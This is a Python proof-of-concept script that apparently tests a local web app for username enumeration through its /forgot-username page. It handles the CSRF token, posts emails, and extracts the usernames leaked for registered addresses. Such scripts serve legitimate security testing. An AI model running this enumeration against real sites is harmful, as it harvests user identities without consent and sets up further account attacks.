"""
POC 3: Username Enumeration via /forgot-username
Target: http://127.0.0.1:5000/forgot-username

Vulnerability:
The /forgot-username route accepts an email address via POST. If the email exists in
the database, it renders the associated username directly inside the response HTML:
  <code class="font-mono text-sm font-bold text-emerald-400 select-all">{{ username }}</code>
If the email does not exist, it renders a generic placeholder message:
  "If an account is associated with this email, your username will be displayed here."
This allows attackers to scrape and verify registered user email addresses.
"""

import http.cookiejar
import re
import urllib.parse
import urllib.request

BASE_URL = "http://127.0.0.1:5000"

def test_email(email):
    cj = http.cookiejar.CookieJar(policy=http.cookiejar.DefaultCookiePolicy(secure_protocols=("https", "http")))
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
    page = opener.open(f"{BASE_URL}/forgot-username").read().decode("utf-8")
    csrf = re.search(r'name="csrf_token"\s+value="([^"]+)"', page).group(1)

    data = urllib.parse.urlencode({"csrf_token": csrf, "email": email}).encode("utf-8")
    req = urllib.request.Request(
        f"{BASE_URL}/forgot-username", data=data,
        headers={"Content-Type": "application/x-www-form-urlencoded"}, method="POST"
    )
    resp = opener.open(req)
    body = resp.read().decode("utf-8")

    # Match current template markup: <code class="...select-all">{{ username }}</code>
    match = re.search(r'<code[^>]*select-all[^>]*>([^<]+)</code>', body)
    if match:
        return True, match.group(1).strip()
    return False, None

def run_poc():
    print("[*] Testing Username Enumeration via /forgot-username...")
    
    # 1. Test existing registered email
    target_email = "alice@cyberdyne.org"
    found, username = test_email(target_email)
    print(f"[+] Querying registered email: '{target_email}'")
    print(f"    -> Leaked Username: '{username}' (Found={found})")

    # 2. Test non-existent email
    unknown_email = "not_found_user_999@example.com"
    found_bad, username_bad = test_email(unknown_email)
    print(f"[+] Querying non-existent email: '{unknown_email}'")
    print(f"    -> Leaked Username: '{username_bad}' (Found={found_bad})")

    if found and not found_bad:
        print(f"[!] ENUMERATION CONFIRMED: '{target_email}' successfully mapped to username '{username}'.")
    else:
        print("[-] Enumeration check failed.")

if __name__ == "__main__":
    run_poc()
